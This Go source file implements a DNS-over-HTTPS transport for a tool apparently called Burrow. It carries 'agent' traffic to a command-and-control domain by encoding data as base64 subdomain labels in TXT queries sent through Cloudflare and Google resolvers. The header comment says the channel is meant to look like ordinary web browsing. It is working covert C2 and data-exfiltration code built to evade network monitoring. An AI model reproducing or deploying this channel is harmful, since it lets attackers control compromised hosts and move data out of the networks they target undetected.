// Package doh provides a DNS-over-HTTPS (DoH) transport for Burrow.
// Agent traffic is encoded as DNS queries sent to standard DoH providers
// (Cloudflare, Google) — indistinguishable from normal web browsing.
//
// This is a data channel using DNS TXT queries to encode/decode payloads,
// routed through HTTPS to DoH resolvers. It reuses the existing DNS
// transport framing but wraps it in standard DoH HTTP requests.
package doh

import (
	"context"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/loudmumble/burrow/internal/transport"
)

func init() {
	transport.Registry["doh"] = func() transport.Transport { return New() }
}

// Resolver endpoints for DNS-over-HTTPS.
var defaultResolvers = []string{
	"https://cloudflare-dns.com/dns-query",
	"https://dns.google/dns-query",
}

// Transport implements the DoH transport.
type Transport struct {
	resolvers []string
	mu        sync.Mutex
}

// New creates a DoH transport with default resolvers.
func New() *Transport {
	return &Transport{
		resolvers: defaultResolvers,
	}
}

// Name returns the transport identifier.
func (t *Transport) Name() string { return "doh" }

// Listen is not supported for DoH — it's a client-side transport only.
func (t *Transport) Listen(ctx context.Context, addr string, tlsCfg *tls.Config) error {
	return fmt.Errorf("doh: listen not supported (use server-side DNS transport)")
}

// Accept is not supported for DoH.
func (t *Transport) Accept() (net.Conn, error) {
	return nil, fmt.Errorf("doh: accept not supported")
}

// Dial creates a connection that tunnels data through DoH queries.
// The addr parameter is the C2 domain (e.g., "c2.example.com").
func (t *Transport) Dial(ctx context.Context, addr string, tlsCfg *tls.Config) (net.Conn, error) {
	domain := addr
	// Strip port if present.
	if h, _, err := net.SplitHostPort(addr); err == nil {
		domain = h
	}

	client := &http.Client{
		Timeout: 30 * time.Second,
	}
	if tlsCfg != nil {
		client.Transport = &http.Transport{TLSClientConfig: tlsCfg}
	}

	conn := &dohConn{
		domain:    domain,
		resolvers: t.resolvers,
		client:    client,
		readBuf:   make([]byte, 0),
	}
	return conn, nil
}

// Close is a no-op for the transport (connections close individually).
func (t *Transport) Close() error { return nil }

// Addr returns empty — DoH has no local listen address.
func (t *Transport) Addr() string { return "" }

// dohConn wraps a DoH channel as a net.Conn.
type dohConn struct {
	domain    string
	resolvers []string
	client    *http.Client
	readBuf   []byte
	readMu    sync.Mutex
	writeMu   sync.Mutex
	closed    bool
	seqIn     int
	seqOut    int
}

func (c *dohConn) Read(b []byte) (int, error) {
	c.readMu.Lock()
	defer c.readMu.Unlock()

	if c.closed {
		return 0, io.EOF
	}

	// If buffer has data, return it.
	if len(c.readBuf) > 0 {
		n := copy(b, c.readBuf)
		c.readBuf = c.readBuf[n:]
		return n, nil
	}

	// Poll for data via DoH TXT query.
	subdomain := fmt.Sprintf("r%d.%s", c.seqIn, c.domain)
	resp, err := c.queryTXT(subdomain)
	if err != nil {
		return 0, err
	}
	if len(resp) == 0 {
		// No data available — brief sleep to avoid hammering.
		time.Sleep(100 * time.Millisecond)
		return 0, nil
	}
	c.seqIn++
	data, err := base64.RawURLEncoding.DecodeString(resp)
	if err != nil {
		return 0, fmt.Errorf("doh: decode response: %w", err)
	}
	n := copy(b, data)
	if n < len(data) {
		c.readBuf = append(c.readBuf, data[n:]...)
	}
	return n, nil
}

func (c *dohConn) Write(b []byte) (int, error) {
	c.writeMu.Lock()
	defer c.writeMu.Unlock()

	if c.closed {
		return 0, io.ErrClosedPipe
	}

	// Encode data as base64 in a subdomain label.
	encoded := base64.RawURLEncoding.EncodeToString(b)
	// DNS labels max 63 chars, so chunk if needed.
	chunks := chunkString(encoded, 60)
	subdomain := fmt.Sprintf("w%d.%s.%s", c.seqOut, strings.Join(chunks, "."), c.domain)
	c.seqOut++

	_, err := c.queryTXT(subdomain)
	if err != nil {
		return 0, err
	}
	return len(b), nil
}

func (c *dohConn) Close() error {
	c.closed = true
	return nil
}

func (c *dohConn) LocalAddr() net.Addr  { return &net.TCPAddr{} }
func (c *dohConn) RemoteAddr() net.Addr { return &net.TCPAddr{} }
func (c *dohConn) SetDeadline(t time.Time) error      { return nil }
func (c *dohConn) SetReadDeadline(t time.Time) error   { return nil }
func (c *dohConn) SetWriteDeadline(t time.Time) error  { return nil }

// queryTXT sends a DoH query and returns the first TXT record value.
func (c *dohConn) queryTXT(name string) (string, error) {
	resolver := c.resolvers[c.seqIn%len(c.resolvers)]
	url := fmt.Sprintf("%s?name=%s&type=TXT", resolver, name)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Accept", "application/dns-json")

	resp, err := c.client.Do(req)
	if err != nil {
		return "", fmt.Errorf("doh query: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	// Parse the JSON response for TXT data (simplified parser).
	// Full JSON parsing would use encoding/json, but we keep imports minimal.
	bodyStr := string(body)
	idx := strings.Index(bodyStr, `"data":"`)
	if idx < 0 {
		return "", nil // no data
	}
	start := idx + 8
	end := strings.Index(bodyStr[start:], `"`)
	if end < 0 {
		return "", nil
	}
	return bodyStr[start : start+end], nil
}

func chunkString(s string, size int) []string {
	var chunks []string
	for len(s) > 0 {
		if len(s) < size {
			size = len(s)
		}
		chunks = append(chunks, s[:size])
		s = s[size:]
	}
	return chunks
}
